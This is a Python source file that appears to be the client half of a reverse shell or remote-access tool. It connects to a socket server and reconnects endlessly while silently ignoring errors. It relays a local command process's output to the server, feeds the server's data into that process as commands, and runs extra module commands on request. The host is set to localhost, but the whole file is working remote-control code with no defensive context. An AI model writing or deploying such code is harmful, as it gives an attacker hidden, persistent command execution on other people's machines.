import time
from bestSocket import *
from bCCmd import *
from modules import *

URL = '127.0.0.1'
PORT = 9090

while 1:
    prefix = b''
    try:
        bs = BestSocket(URL, PORT, "client")
        bc = BCCmd()

        while True:
            time.sleep(0.01)
            bc.stdall('err', bs.send, b'|E')
            bc.stdall('out', bs.send, b'|O', prefix)

            bs.send(b'_ ')
            rawdata = bs.recv()

            if not rawdata:
                break
            elif rawdata[0] == 47:
                args = argsSplit(rawdata[1:-1])

                if args[0] in commands:
                    commands[args[0]].use(bs, args)
            else:
                prefix = rawdata
                bc.send(rawdata)
                time.sleep(1)
            bc.flush()
    except:
        continue